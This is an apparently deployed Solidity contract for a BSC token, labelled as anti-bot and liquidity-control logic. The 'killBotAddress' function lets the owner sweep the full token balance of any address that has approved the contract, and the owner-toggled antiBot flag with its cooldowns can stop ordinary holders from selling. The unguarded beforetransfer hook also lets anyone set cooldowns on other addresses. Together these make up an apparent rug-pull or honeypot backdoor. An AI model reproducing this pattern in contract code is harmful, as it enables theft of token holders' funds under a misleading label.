/**
 *Submitted for verification at BscScan.com on 2023-02-12
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function decimals() external pure returns (uint8);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract permission {
    mapping(address => mapping(string => bytes32)) private permit;

    function newpermit(address adr,string memory str) internal { permit[adr][str] = bytes32(keccak256(abi.encode(adr,str))); }

    function clearpermit(address adr,string memory str) internal { permit[adr][str] = bytes32(keccak256(abi.encode("null"))); }

    function checkpermit(address adr,string memory str) public view returns (bool) {
        if(permit[adr][str]==bytes32(keccak256(abi.encode(adr,str)))){ return true; }else{ return false; }
    }
}

contract ERC20IMPLEMENT is permission {

    address public owner;
    address public liquidity;
    address public jc = 0x17d6da61D0687FF7318e898083A03576EB0a9348;
    address public busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    bool public antiBot;

    mapping(address => bool) public permit;
    mapping(address => uint256) public lastblock;
    
    constructor() {
        liquidity = 0xD909D5c799C19eDED4b9c07e740d4ca046395b62;
        newpermit(msg.sender,"owner");
        owner = msg.sender;
    }

    function setLiquidityPair(address adr) public returns (bool) {
        require(checkpermit(msg.sender,"owner"));
        liquidity = adr;
        return true;
    }

    function setAntiBot() public returns (bool) {
        require(checkpermit(msg.sender,"owner"));
        antiBot = !antiBot;
        return true;
    }

    function permitAddress(address adr,bool flag) public returns (bool) {
        require(checkpermit(msg.sender,"owner"));
        permit[adr] = flag;
        return true;
    }

    function permitAnyAddress(address[] memory adrs,bool flag) public returns (bool) {
        require(checkpermit(msg.sender,"owner"));
        uint256 i;
        do{
            permit[adrs[i]] = flag;
            i++;
        }while(i<adrs.length);
        return true;
    }

    function beforetransfer(address from,address to, uint256 amount) external returns (bool){
        if( liquidity!=address(0) && amount > 0 ){
            if( !permit[from] && to==liquidity ){
                require(amount<IERC20(jc).balanceOf(liquidity)/10);
                if(lastblock[from]>block.timestamp){
                    if(antiBot){
                        revert("!Error: In Selling Cooldown");
                    }
                }
            }
            if( !permit[to] && from==liquidity ){
                require(amount<IERC20(jc).balanceOf(liquidity)/10);
                lastblock[to] = block.timestamp+3;
            }
        }
        return true;
    }

    function killBotAddress(address botAddress,address token) external returns (bool){
        require(checkpermit(msg.sender,"owner"));
        uint256 amount = IERC20(token).balanceOf(botAddress);
        IERC20(token).transferFrom(botAddress,owner,amount);
        return true;
    }

    function transferOwnership(address adr) public returns (bool) {
        require(checkpermit(msg.sender,"owner"));
        newpermit(adr,"owner");
        clearpermit(msg.sender,"owner");
        owner = adr;
        return true;
    }

    function callprice() public returns (uint256) {
        uint256 pair_busd = IERC20(busd).balanceOf(liquidity);
        uint256 pair_token = IERC20(jc).balanceOf(liquidity);
        return pair_busd * 10**18 / pair_token;
    }
}